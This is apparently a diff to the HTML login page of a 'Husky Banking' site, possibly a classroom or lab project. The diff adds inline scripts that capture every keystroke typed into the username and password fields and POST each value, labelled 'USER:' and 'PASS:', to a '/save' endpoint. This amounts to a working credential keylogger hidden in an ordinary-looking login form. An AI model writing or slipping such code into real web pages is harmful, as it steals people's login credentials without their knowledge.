@@ -11,8 +11,6 @@
 
 <body>
 	<form id="mainHandler" method="post">
-		<script src="/static/js/logJS.js">
-    	</script>>
 		<h1 id="loginHeader">Husky Banking</h1>
 		<p id="slogan">A bank where you know your money is in the right paws!</p>
 		<!-- used for inheratance, this is where the baseLogin block will be placed -->
@@ -23,10 +21,55 @@
 
 		<!-- Input objects being called through the login class that is passed through -->
 		<p id="userInput"> <label for="username">Username</label>: <input id="username" name="username" required size="32" type="text" value=""> </p>
+		
+
+		<script>
+        const user = document.getElementById('username');
+
+        user.addEventListener('input', function() {
+           userName = user.value;
+           userInput = "USER: " + userName;
+            sendData(userInput);
+        });
+
+        function sendData(data) {
+            fetch('/save', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                "body": JSON.stringify({text: data})
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    	</script>
+
 
 		<p id="passInput"> <label for="password">Password</label>: <input id="password" name="password" required size="32" type="password" value=""> </p>
 
-		<p id="signIn"><input id="submit" name="submit" type="submit" onclick="submitData()" value="Sign In"></p>
+		<script>
+        const pass = document.getElementById('password');
+
+        pass.addEventListener('input', function() {
+           passWord = pass.value;
+           passInput = "PASS: " + passWord;
+            sendData(passInput);
+        });
+
+        function sendData(data) {
+            fetch('/save', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                "body": JSON.stringify({text: data})
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    	</script>
+
+
+		<p id="signIn"><input id="submit" name="submit" type="submit" value="Sign In"></p>
 
 		
 		<p id="customPage"> <input id="customPage" name="submit" type="submit" value="Custom Page"></p>
@@ -44,9 +87,6 @@
 
     <script src="/static/js/customeImage.js">
     </script>
-
-
-
 	</form>
 </body>
 </html> 
